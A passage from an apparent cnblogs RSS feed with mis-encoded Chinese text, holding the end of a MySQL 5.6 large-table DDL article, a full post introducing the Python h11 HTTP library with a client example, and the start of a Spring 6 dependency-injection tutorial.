<li><span style="font-family: &quot;Microsoft YaHei&quot;">ç¦æ­¢æ°å¢ âéç©ºæ é»è®¤å¼â å­æ®µï¼MySQL 5.6 ä¼å¨è¡¨éè¡åå§åï¼2000 ä¸è¡è¡¨èæ¶æ°å°æ¶ï¼ä¸å ç¨å¤§éèµæºï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">ç¦æ­¢ DDL ç­å¾ MDL éæ¶æ å¨äºè¡·ï¼MySQL 5.6 MDL éæ è¶æ¶ï¼éæå¨ç»æ­¢æéè¿ç¨ï¼å¦åä¼æ éé»å¡åç»­æææä½ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">ç¦æ­¢ä¿®æ¹ MySQL åæ°åä¸æ¢å¤ï¼å°¤å¶æ¯<code>innodb_flush_log_at_trx_commit=2</code>ï¼ä¼éä½æ°æ®æä¹æ§ï¼å®æºå¯è½ä¸¢å¤±æ°æ®ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">ç¦æ­¢å¨ DDL æ§è¡ä¸­æå¨ä¸­æ­è¿ç¨ï¼ä¸­æ­ä¼å¯¼è´ä¹åçæ·è´å·¥ä½ç½è´¹ï¼éæ°æ§è¡éåæ¬¡è·å MDL éï¼èæ¶ç¿»åï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">ç¦æ­¢å¿½ç¥è¡¨ç»æéªè¯ï¼DDL è¿ç¨æ¶å¤±åï¼å¿é¡»éè¿ DESC/SHOW CREATE TABLE ç¡®è®¤å­æ®µå±æ§ï¼é¿åå®ä¹ç¼ºå¤±ã</span></li>
</ol>
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">ä¸ãå»¶ä¼¸ä¼åï¼é¿æè§£å³æ¹æ¡</span></h2>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">æ¬æ¬¡å®æä¸º MySQL 5.6 ç¯å¢çä¸´æ¶æä¼è§£ï¼è¥ä¸å¡ä¾§åè®¸ï¼åçº§è³ MySQL 5.7/8.0æ¯å¤çå¤§è¡¨ DDL çç»ææ¹æ¡ï¼</span></div>
<ol>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">é«çæ¬æ¯æè¡¨ç»æåæ°æ®åå°ä¿®æ¹ï¼æ°å¢æ°å¼ç±»å / VARCHAR ç±»åï¼åè®¸ç©º / ç®åé»è®¤å¼ï¼å­æ®µæ¶ï¼ä»ä¿®æ¹åæ°æ®ï¼æ éå¨è¡¨æ·è´ï¼2000 ä¸è¡è¡¨èæ¶æ¯«ç§çº§ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">MDL éæºå¶ä¼åï¼æ¯æéè¶æ¶ãæéæºå¶ä¼åï¼åå°éè¡¨æ¦çï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">æ´ä½æ§è½æåï¼æ¥è¯¢ä¼åãå¹¶åæ§å¶ãéæºå¶åä¼äº 5.6ï¼é«é¢è¯»åè¡¨çæ´ä½æ§è½æå 30%-50%ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">çææ´å®åï¼æ¯æ JSON ç±»åãçªå£å½æ°ãå¹¶è¡å¤å¶ç­æ°ç¹æ§ï¼æ»¡è¶³ä¸å¡åç»­åå±éæ±ã</span></li>
</ol>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">åçº§æ³¨æäºé¡¹ï¼åçº§åå¨éå¤ä»½æ°æ®åºï¼éæ©ä½å³°ææ§è¡ï¼ä¸»ä»åæ¢å¯å®ç°ä¸å¡æ æç¥åçº§ï¼5.7/8.0 ä¸ 5.6 å¼å®¹æ§æé«ï¼æ®éä¸å¡ä»£ç æ éä¿®æ¹ã</span></div>
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">å«ãæ»ç»</span></h2>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">æ¬æ¬¡ MySQL 5.6 2000 ä¸è¡é«é¢è¯»åè¡¨æ°å¢å­æ®µçå®æï¼æ ¸å¿å´ç» **âå©ç¨çæ¬ç¹æ§åä¼åãè§é¿ MDL éæºå¶åãå¹³è¡¡èµæºç«äºä¸ä¸å¡ç¨³å®æ§âå±å¼ï¼æç»å®ç°äºæ éãæ ä¸å¡æç¥ãé«æ ** çè½å°ï¼æ ¸å¿ç»è®ºå¦ä¸ï¼</span></div>
<ol>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">MySQL 5.6 è½æ é«çæ¬çåæ°æ®åå°ä¿®æ¹ä¼åï¼ä½éè¿æ¾å¼æå®ç®åé»è®¤å¼ï¼å¯å¤§å¹éä½ DDL æ§è¡æ¶é´ï¼æ¯ 2000 ä¸è¡è¡¨çæä¼ä¸´æ¶æ¹æ¡ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">éè¡¨çæ ¸å¿æ ¹æºå¹¶é DDL æ¬èº«ï¼èæ¯MDL éç­å¾ + é¿äºå¡é»å¡ï¼æ§è¡åæ¸çéæºæ¯é¿åå³é®ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">Online DDL çæ éç¹æ§ä»å­å¨äºMDL éè·åæååï¼executing/copying to tmp table ç¶æï¼ï¼æ­¤é¶æ®µè±ç¦»éè¡¨é£é©ï¼åç»­ä»å­å¨èµæºç«äºï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">é«é¢è¯»ååºæ¯ä¸æ§è¡ DDLï¼æ éæåä¸å¡ï¼ä»éä½å³°ææ§è¡ + ä¸´æ¶åæ°è°ä¼ï¼ä¸å¡å»¶è¿ä»ä¸ºæ¯«ç§çº§âåæ¯«ç§çº§ï¼å®å¨æ æç¥ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">æææä½åä¸º MySQL åç½®å½ä»¤ + å¨æåæ°è°æ´ï¼æ éå®è£é¢å¤å·¥å·ï¼ééçäº§ç¯å¢ç´§æ¥ææ¥åæ¥å¸¸å®æã</span></li>
</ol>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">æ¬æ¬¡å®æçæ¹æ¡å¯å¤ç¨äº MySQL 5.6 ç¯å¢ä¸ææå¤§è¡¨ï¼åä¸çº§ï¼çæ®éå­æ®µæ°å¢æä½ï¼ä¸ºåçæ¬ãååºæ¯çæ°æ®åºè¿ç»´æä¾å¯è½å°çåèã</span></div>
</div>

</div>
<div id="MySignature" role="contentinfo">
    <div style="border: 2px solid yellow;">
<p style="font-weight:bold;">  æ¶é´ä»ä¿ï¼å¦æéè¯¯æ¬¢è¿æåºï¼æ¬¢è¿å¨è¯è®ºåºè®¨è®ºï¼å¦å¯¹æ¨æå¸®å©è¿è¯·ç¹ä¸ªæ¨èãå³æ³¨æ¯æä¸ä¸</p>
<p style="font-weight:bold;">  ä½èï¼<a href="http://www.cnblogs.com/xxhxs-21/" target="_blank">åå®¢å­ - åå¹´ææ¯</a></p>
<p style="font-weight:bold;">  åºå¤ï¼<a href="http://www.cnblogs.com/xxhxs-21/" target="_blank">http://www.cnblogs.com/xxhxs-21/</a></p>
<p>  æ¬æçæå½ä½èååå®¢å­å±æï¼æ¬¢è¿è½¬è½½ï¼ä½æªç»ä½èåæå¿é¡»å¨æç« é¡µé¢ç»åºåæé¾æ¥ï¼å¦åä¿çè¿½ç©¶æ³å¾è´£ä»»çæå©ã</p>
<p>  è¥åå®¹æä¾µç¯æ¨æççå°æ¹ï¼è¯·å¬åæ å¤èç³»æ¬äººï¼æ¬äººå®ç§¯æéåå¤çè§£å³ã</p>
</div>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 15:14">2026-02-02 15:13</span>&nbsp;
<a href="https://www.cnblogs.com/xxhxs-21">åå¹´ææ¯</a>&nbsp;
éè¯»(<span id="post_view_count">41</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19564624);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19564624', targetLink: 'https://www.cnblogs.com/xxhxs-21/p/19564624', title: 'MySQL 5.6 2000 ä¸è¡é«é¢è¯»åè¡¨æ°å¢å­æ®µå®æï¼ä»æ¢æ§è¡å°æ éè½å°å¨è§£æ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ä¸å¤©ä¸ä¸ªPythonåºï¼h11 - çº¯ Python HTTP/1.1 åè®®å®ç° ]]></title>
    <link>https://www.cnblogs.com/min2k/p/19563620</link>
    <guid>ef97980486885b64293d1c881638bfcd</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/min2k/p/19563620" title="åå¸äº 2026-02-02 12:21">
    <span role="heading" aria-level="2">ä¸å¤©ä¸ä¸ªPythonåºï¼h11 - çº¯ Python HTTP/1.1 åè®®å®ç°</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="h11---çº¯-python-http11-åè®®å®ç°">h11 - çº¯ Python HTTP/1.1 åè®®å®ç°</h1>
<h2 id="ä¸ä»ä¹æ¯h11">ä¸ãä»ä¹æ¯h11ï¼</h2>
<p><strong>h11</strong> æ¯ä¸ä¸ªç¨äºä½å±ãäºä»¶é©±å¨ç HTTP/1.1 åè®®å®ç°ç Python åºã<br>
å®å¯ä»¥å¸®å©ä½ ï¼</p>
<ul>
<li>è§£æä¼ å¥ç HTTP è¯·æ±åååºæ°æ®æµ</li>
<li>åºååä¼ åºç HTTP è¯·æ±åååºæ°æ®ä»¥ä¾¿åé</li>
<li>å¤ç HTTP åè®®ä¸­çåç§ç¶æè½¬æ¢</li>
</ul>
<h2 id="äºåºç¨åºæ¯">äºãåºç¨åºæ¯</h2>
<p><strong>h11</strong> å¹¿æ³åºç¨äºä»¥ä¸å®éåºæ¯ï¼</p>
<ul>
<li><strong>é«æ§è½Webæå¡å¨</strong>: ä½ä¸ºå¼æ­¥Webæ¡æ¶ï¼å¦Hypercornï¼çåºç¡ï¼å¤çåºå±HTTPåè®®ã</li>
<li><strong>èªå®ä¹HTTPå®¢æ·ç«¯</strong>: æå»ºèªå·±çHTTPå®¢æ·ç«¯ï¼å¯¹åè®®ç»èææ´ç²¾ç»çæ§å¶ã</li>
<li><strong>HTTPä»£çåä¸­é´ä»¶</strong>: æ¦æªåä¿®æ¹HTTPæµéï¼å®ç°ç¼å­ãæ¥å¿æå®å¨åè½ã</li>
</ul>
<h2 id="ä¸å¦ä½å®è£">ä¸ãå¦ä½å®è£</h2>
<ol>
<li>ä½¿ç¨ pip å®è£</li>
</ol>
<pre><code class="language-bash">pip install h11

# å¦æå®è£æ¢çè¯ï¼æ¨èä½¿ç¨å½åéåæº
pip install h11 -i https://www.python64.cn/pypi/simple/
</code></pre>
<ol start="2">
<li>ä½¿ç¨ <a href="https://www.min2k.com/tools/python-run/" target="_blank" rel="noopener nofollow">PythonRun</a> å¨çº¿è¿è¡ä»£ç ï¼æ éæ¬å°å®è£ï¼</li>
</ol>
<h2 id="åç¤ºä¾ä»£ç ">åãç¤ºä¾ä»£ç </h2>
<p>åå»ºä¸ä¸ªç®åç h11 å®¢æ·ç«¯è¯·æ±</p>
<pre><code class="language-python">import h11

# åå»ºä¸ä¸ª h11 ç¶ææºï¼æ¨¡æå®¢æ·ç«¯
conn = h11.Connection(our_role=h11.CLIENT)

# æé è¯·æ±å¤´
request = h11.Request(
    method=b"GET",
    target=b"/",
    headers=[
        (b"Host", b"example.com"),
        (b"User-Agent", b"h11-example-client"),
    ],
)

# åéè¯·æ±å¤´ï¼å¹¶è·ååºåååçå­èæ°æ®
data_to_send = conn.send(request)
print(f"åéè¯·æ±å¤´æ°æ®: {data_to_send!r}")

# æ¨¡ææ¥æ¶å°æå¡å¨çååºå¤´
# æ³¨æï¼å¨å®éåºç¨ä¸­ï¼è¿éä¼ä»ç½ç»socketè¯»åæ°æ®
response_data_from_server = (
    b"HTTP/1.1 200 OK\r\n"
    b"Content-Length: 13\r\n"
    b"Content-Type: text/plain\r\n"
    b"\r\n"
)
conn.receive_data(response_data_from_server)

# å¤çæ¥æ¶å°çäºä»¶ï¼ç´å°è§£æåºååº
while True:
    event = conn.next_event()
    if isinstance(event, h11.Response):
        print(f"æ¥æ¶å°ååº: {event.status_code} {event.headers}")
        # æ ¹æ®ç¶æç å¤æ­æ¯å¦æå
        if event.status_code == 200:
            print("è¯·æ±æå!")
        else:
            print(f"è¯·æ±å¤±è´¥ï¼ç¶æç : {event.status_code}")
        break # éåºå¾ªç¯
    elif event == h11.NEED_DATA:
        # å¨å®éåºç¨ä¸­ï¼è¿éä¼ä»socketç»§ç»­è¯»åæ°æ®
        print("éè¦æ´å¤æ°æ®æè½å®æè§£æ...")
        break # ç¤ºä¾ä¸­ä¸åæ¨¡ææ´å¤æ°æ®ï¼ç´æ¥éåº
    elif event == h11.PAUSED:
        print("è§£ææå...")
        break
    else:
        print(f"æ¥æ¶å°å¶ä»äºä»¶: {type(event)}")

</code></pre>
<p>ä½¿ç¨ <a href="https://www.min2k.com/tools/python-run/?code=import%20h11%0A%0A%23%20%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%20h11%20%E7%8A%B6%E6%80%81%E6%9C%BA%EF%BC%8C%E6%A8%A1%E6%8B%9F%E5%AE%A2%E6%88%B7%E7%AB%AF%0Aconn%20%3D%20h11.Connection%28our_role%3Dh11.CLIENT%29%0A%0A%23%20%E6%9E%84%E9%80%A0%E8%AF%B7%E6%B1%82%E5%A4%B4%0Arequest%20%3D%20h11.Request%28%0A%20%20%20%20method%3Db%22GET%22%2C%0A%20%20%20%20target%3Db%22%2F%22%2C%0A%20%20%20%20headers%3D%5B%0A%20%20%20%20%20%20%20%20%28b%22Host%22%2C%20b%22example.com%22%29%2C%0A%20%20%20%20%20%20%20%20%28b%22User-Agent%22%2C%20b%22h11-example-client%22%29%2C%0A%20%20%20%20%5D%2C%0A%29%0A%0A%23%20%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E5%A4%B4%EF%BC%8C%E5%B9%B6%E8%8E%B7%E5%8F%96%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%9A%84%E5%AD%97%E8%8A%82%E6%95%B0%E6%8D%AE%0Adata_to_send%20%3D%20conn.send%28request%29%0Aprint%28f%22%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%95%B0%E6%8D%AE%3A%20%7Bdata_to_send!r%7D%22%29%0A%0A%23%20%E6%A8%A1%E6%8B%9F%E6%8E%A5%E6%94%B6%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%93%8D%E5%BA%94%E5%A4%B4%0A%23%20%E6%B3%A8%E6%84%8F%EF%BC%9A%E5%9C%A8%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8%E4%B8%AD%EF%BC%8C%E8%BF%99%E9%87%8C%E4%BC%9A%E4%BB%8E%E7%BD%91%E7%BB%9Csocket%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%0Aresponse_data_from_server%20%3D%20%28%0A%20%20%20%20b%22HTTP%2F1.1%20200%20OK%5Cr%5Cn%22%0A%20%20%20%20b%22Content-Length%3A%2013%5Cr%5Cn%22%0A%20%20%20%20b%22Content-Type%3A%20text%2Fplain%5Cr%5Cn%22%0A%20%20%20%20b%22%5Cr%5Cn%22%0A%29%0Aconn.receive_data%28response_data_from_server%29%0A%0A%23%20%E5%A4%84%E7%90%86%E6%8E%A5%E6%94%B6%E5%88%B0%E7%9A%84%E4%BA%8B%E4%BB%B6%EF%BC%8C%E7%9B%B4%E5%88%B0%E8%A7%A3%E6%9E%90%E5%87%BA%E5%93%8D%E5%BA%94%0Awhile%20True%3A%0A%20%20%20%20event%20%3D%20conn.next_event%28%29%0A%20%20%20%20if%20isinstance%28event%2C%20h11.Response%29%3A%0A%20%20%20%20%20%20%20%20print%28f%22%E6%8E%A5%E6%94%B6%E5%88%B0%E5%93%8D%E5%BA%94%3A%20%7Bevent.status_code%7D%20%7Bevent.headers%7D%22%29%0A%20%20%20%20%20%20%20%20%23%20%E6%A0%B9%E6%8D%AE%E7%8A%B6%E6%80%81%E7%A0%81%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F%0A%20%20%20%20%20%20%20%20if%20event.status_code%20%3D%3D%20200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20print%28%22%E8%AF%B7%E6%B1%82%E6%88%90%E5%8A%9F!%22%29%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20print%28f%22%E8%AF%B7%E6%B1%82%E5%A4%B1%E8%B4%A5%EF%BC%8C%E7%8A%B6%E6%80%81%E7%A0%81%3A%20%7Bevent.status_code%7D%22%29%0A%20%20%20%20%20%20%20%20break%20%23%20%E9%80%80%E5%87%BA%E5%BE%AA%E7%8E%AF%0A%20%20%20%20elif%20event%20%3D%3D%20h11.NEED_DATA%3A%0A%20%20%20%20%20%20%20%20%23%20%E5%9C%A8%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8%E4%B8%AD%EF%BC%8C%E8%BF%99%E9%87%8C%E4%BC%9A%E4%BB%8Esocket%E7%BB%A7%E7%BB%AD%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%0A%20%20%20%20%20%20%20%20print%28%22%E9%9C%80%E8%A6%81%E6%9B%B4%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%89%8D%E8%83%BD%E5%AE%8C%E6%88%90%E8%A7%A3%E6%9E%90...%22%29%0A%20%20%20%20%20%20%20%20break%20%23%20%E7%A4%BA%E4%BE%8B%E4%B8%AD%E4%B8%8D%E5%86%8D%E6%A8%A1%E6%8B%9F%E6%9B%B4%E5%A4%9A%E6%95%B0%E6%8D%AE%EF%BC%8C%E7%9B%B4%E6%8E%A5%E9%80%80%E5%87%BA%0A%20%20%20%20elif%20event%20%3D%3D%20h11.PAUSED%3A%0A%20%20%20%20%20%20%20%20print%28%22%E8%A7%A3%E6%9E%90%E6%9A%82%E5%81%9C...%22%29%0A%20%20%20%20%20%20%20%20break%0A%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20print%28f%22%E6%8E%A5%E6%94%B6%E5%88%B0%E5%85%B6%E4%BB%96%E4%BA%8B%E4%BB%B6%3A%20%7Btype%28event%29%7D%22%29%0A" target="_blank" rel="noopener nofollow">PythonRun</a> å¨çº¿è¿è¡è¿æ®µä»£ç ï¼ç»æå¦ä¸ï¼</p>
<pre><code class="language-text">åéè¯·æ±å¤´æ°æ®: b'GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: h11-example-client\r\n\r\n'
æ¥æ¶å°ååº: 200 &lt;Headers([(b'content-length', b'13'), (b'content-type', b'text/plain')])&gt;
è¯·æ±æå!
</code></pre>
<p>ä½¿ç¨ <a href="https://www.min2k.com/tools/mermaid/?code=flowchart%20TB%0A%20%20%20%20A%5B%E5%BC%80%E5%A7%8B%5D%20--%3E%20B%7B%E5%88%9B%E5%BB%BAh11%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5%7D%3B%0A%20%20%20%20B%20--%3E%20C%5B%E6%9E%84%E9%80%A0HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4%5D%3B%0A%20%20%20%20C%20--%3E%20D%5B%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%B9%B6%E8%8E%B7%E5%8F%96%E5%AD%97%E8%8A%82%5D%3B%0A%20%20%20%20D%20--%3E%20E%7B%E6%89%93%E5%8D%B0%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE%7D%3B%0A%20%20%20%20E%20--%3E%20F%5B%E6%A8%A1%E6%8B%9F%E6%8E%A5%E6%94%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%93%8D%E5%BA%94%E5%A4%B4%5D%3B%0A%20%20%20%20F%20--%3E%20G%5B%E5%B0%86%E5%93%8D%E5%BA%94%E6%95%B0%E6%8D%AE%E9%A6%88%E5%85%A5h11%E8%BF%9E%E6%8E%A5%5D%3B%0A%20%20%20%20G%20--%3E%20H%7B%E5%BE%AA%E7%8E%AF%E5%A4%84%E7%90%86%E4%BA%8B%E4%BB%B6%7D%3B%0A%20%20%20%20H%20--%20h11.Response%20--%3E%20I%5B%E6%89%93%E5%8D%B0%E5%93%8D%E5%BA%94%E4%BF%A1%E6%81%AF%5D%3B%0A%20%20%20%20I%20--%3E%20J%7B%E5%88%A4%E6%96%AD%E7%8A%B6%E6%80%81%E7%A0%81%7D%3B%0A%20%20%20%20J%20--%20200%20--%3E%20K%5B%E6%89%93%E5%8D%B0%22%E8%AF%B7%E6%B1%82%E6%88%90%E5%8A%9F!%22%5D%3B%0A%20%20%20%20J%20--%20else%20--%3E%20L%5B%E6%89%93%E5%8D%B0%22%E8%AF%B7%E6%B1%82%E5%A4%B1%E8%B4%A5...%22%E5%8F%8A%E7%8A%B6%E6%80%81%E7%A0%81%5D%3B%0A%20%20%20%20J%20--%20%E6%97%A0%E8%AE%BA%E4%BD%95%E7%A7%8D%E6%83%85%E5%86%B5%20--%3E%20M%5B%E8%B7%B3%E5%87%BA%E5%BE%AA%E7%8E%AF%5D%3B%0A%20%20%20%20H%20--%20h11.NEED_DATA%2Fh11.PAUSED%20--%3E%20N%5B%E6%89%93%E5%8D%B0%E6%8F%90%E7%A4%BA%E5%B9%B6%E8%B7%B3%E5%87%BA%E5%BE%AA%E7%8E%AF%5D%3B%0A%20%20%20%20H%20--%20%E5%85%B6%E4%BB%96%E4%BA%8B%E4%BB%B6%20--%3E%20O%5B%E6%89%93%E5%8D%B0%E4%BA%8B%E4%BB%B6%E7%B1%BB%E5%9E%8B%5D%3B%0A%20%20%20%20O%20--%3E%20H%3B%0A%20%20%20%20M%20--%3E%20P%5B%E7%BB%93%E6%9D%9F%5D%3B%0A%20%20%20%20N%20--%3E%20P%3B" target="_blank" rel="noopener nofollow">MermaidGo</a> ç»å¶ç¤ºä¾ä»£ç çæµç¨å¾ï¼ç»æå¦ä¸ï¼</p>
<p><img alt="MermerGoçh11æµç¨å¾" loading="lazy" data-src="https://img2024.cnblogs.com/blog/70894/202602/70894-20260202122042409-1959172176.jpg" class="lazyload"></p>
<h2 id="äºå­¦ä¹ èµæº">äºãå­¦ä¹ èµæº</h2>
<ol>
<li>å¼æºé¡¹ç®ï¼<a href="https://github.com/python-hyper/h11" target="_blank" rel="noopener nofollow">h11</a></li>
<li>ä¸­æèªè¿°ï¼<a href="https://www.python64.cn/readme/h11/" target="_blank" rel="noopener nofollow">REMDME</a></li>
<li>å¨çº¿è¿è¡ï¼<a href="https://www.min2k.com/tools/python-run/" target="_blank" rel="noopener nofollow">PythonRun</a></li>
</ol>
<blockquote>
<p>å¦æè¿ç¯æç« å¯¹ä½ æå¸®å©ï¼æ¬¢è¿ç¹èµãæ¶èãè½¬åï¼<br>
å­¦ä¹ è¿ç¨ä¸­æä»»ä½é®é¢ï¼æ¬¢è¿å¨è¯è®ºåºçè¨äº¤æµï½</p>
</blockquote>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 12:21">2026-02-02 12:21</span>&nbsp;
<a href="https://www.cnblogs.com/min2k">æç¼ç¨</a>&nbsp;
éè¯»(<span id="post_view_count">137</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19563620);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19563620', targetLink: 'https://www.cnblogs.com/min2k/p/19563620', title: 'ä¸å¤©ä¸ä¸ªPythonåºï¼h11 - çº¯ Python HTTP/1.1 åè®®å®ç°' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ spring6-å¤ç§ç±»åçæ³¨å¥æ¹å¼ ]]></title>
    <link>https://www.cnblogs.com/alineverstop/p/19563560</link>
    <guid>835b5405e02d81c28ecf7a2e559e8305</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/alineverstop/p/19563560" title="åå¸äº 2026-02-02 12:12">
    <span role="heading" aria-level="2">spring6-å¤ç§ç±»åçæ³¨å¥æ¹å¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="ocpåå">OCPåå</h1>
<p>ocpæå¼é­ååï¼å¯¹æ©å±å¼æ¾ï¼å¯¹ä¿®æ¹å³é­ãæ¯ä¸å¤§ååä¸­æåºæ¬çä¸ä¸ªååã</p>
<h1 id="ä¾èµåç½®åådip">ä¾èµåç½®ååï¼DIPï¼</h1>
<h2 id="ä»ä¹æ¯ä¾èµåç½®åå">ä»ä¹æ¯ä¾èµåç½®åå</h2>
<p>æ ¸å¿æ¯é¢åæ¥å£ç¼ç¨ãé¢åæ½è±¡ç¼ç¨ï¼ ä¸æ¯é¢åå·ä½ç¼ç¨ã</p>
<h2 id="ä¾èµåç½®ååçç®ç">ä¾èµåç½®ååçç®ç</h2>
<p>éä½è¦ååº¦ï¼æé«æ©å±å</p>
<h1 id="ä»ä¹æ¯æ§å¶åè½¬">ä»ä¹æ¯æ§å¶åè½¬</h1>
<p>æ§å¶åè½¬ï¼Iocï¼Inversion of Controllï¼ï¼ä¸ç§ç¼ç¨ææ³ãè®¾è®¡æ¨¡å¼ãä¸ºäºéä½ç¨åºè¦ååº¦</p>
<p>åè½¬æä¸¤ç¹ï¼</p>
<ol>
<li>ä¸å¨ç¨åºä¸­éç¨ç¡¬ç¼ç çæ¹å¼newå¯¹è±¡ï¼æåå»ºå¯¹è±¡äº¤ç»å«äººï¼UserService userService = new UserServiceImplForMysql()ï¼ã</li>
<li>ä¸å¨ç¨åºä¸­éç¨ç¡¬ç¼ç çæ¹å¼ç»´æ¤å¯¹è±¡å³ç³»ã</li>
</ol>
<h1 id="springæ¡æ¶">springæ¡æ¶</h1>
<p>springå®ç°äºIocï¼å æ­¤å¯ä»¥åå»ºåç»´æ¤å¯¹è±¡è§çå³ç³»ã</p>
<p>æ§å¶åè½¬å®ç°æ¹å¼ä¸»è¦æ <strong>ä¾èµæ³¨å¥ï¼Dependency Injection DIï¼</strong></p>
<p>ä¾èµæ³¨å¥çæ¹å¼æä»¥ä¸æ¹å¼ï¼</p>
<ol>
<li>Setæ³¨å¥ï¼æ§è¡Setæ¹æ³èµå¼ï¼</li>
<li>æé æ¹æ³æ³¨å¥ï¼æ§è¡æé æ¹æ³èµå¼ï¼</li>
</ol>
<h2 id="ä¾èµæ³¨å¥ä¸­çä¾èµæ³¨å¥çå«ä¹">ä¾èµæ³¨å¥ä¸­çâä¾èµâãâæ³¨å¥âçå«ä¹</h2>
<p>ä¾èµï¼Aå¯¹è±¡åBå¯¹è±¡çå³ç³»</p>
<p>æ³¨å¥ï¼æ¯ä¸ç§ææ®µï¼éè¿è¿ç§ææ®µè®©AåBäº§çå³ç³»ã</p>
<p>ä¾èµæ³¨å¥çå®ç°æ¹å¼æï¼setæ³¨å¥åæé æ¹æ³æ³¨å¥ã</p>
<h3 id="setæ³¨å¥">setæ³¨å¥</h3>
<ol>
<li>éç½®æä»¶éç½®bean</li>
</ol>
<pre><code class="language-xml">&lt;!--    éç½®dao--&gt;
    &lt;bean id="userDao" class="com.ali.dao.UserDao"&gt;
    &lt;/bean&gt;
&lt;!--    éç½®Service--&gt;
    &lt;bean id="userService" class="com.ali.service.UserService"&gt;
        &lt;!--æ³¨å¥daoï¼è¿éçnameæ¯ setæ¹æ³åå»æsetå­ç¬¦åå©ä¸çåè¯é¦å­æ¯å°å--&gt;
&lt;!--        refåé¢æå®è¦æ³¨å¥çbeançid--&gt;
        &lt;property name="userDao" ref="userDao"/&gt;
    &lt;/bean&gt;
</code></pre>
<ol start="2">
<li>å¨ç±»ä¸­åsetæ¹æ³</li>
</ol>
<pre><code class="language-java">package com.ali.service;

import com.ali.dao.UserDao;

public class UserService {

    private UserDao userDao;

    // setæ³¨å¥éè¦æä¾ä¸ä¸ªsetæ¹æ³ï¼æ¹æ³åä»¥setå¼å¤´ï¼springå®¹å¨è°ç¨è¿ä¸ªsetæ¹æ³æ³¨å¥UserDao
        public void setUserDao(UserDao userDao) {
        this.userDao = userDao;
    }

    public void saveUser(){
        userDao.insertUser();
    }
}
</code></pre>
<p>è¿æ ·å³å¯æ³¨å¥æåã</p>
<h4 id="æ³¨å¥å¤é¨bean">æ³¨å¥å¤é¨bean</h4>
<pre><code class="language-xml">&lt;!--    å£°æbean--&gt;
    &lt;bean id="orderDao" class="com.ali.dao.OrderDao" /&gt;

    &lt;bean id="orderService" class="com.ali.service.OrderService"&gt;
&lt;!--    ä½¿ç¨ref æ¥    æ³¨å¥å¤é¨bean--&gt;
        &lt;property name="orderDao" ref="orderDao"/&gt;
    &lt;/bean&gt;
</code></pre>
<h4 id="æ³¨å¥åé¨bean">æ³¨å¥åé¨bean</h4>
<pre><code class="language-xml">    &lt;bean id="orderService2" class="com.ali.service.OrderService"&gt;
      &lt;property name="orderDao"&gt;
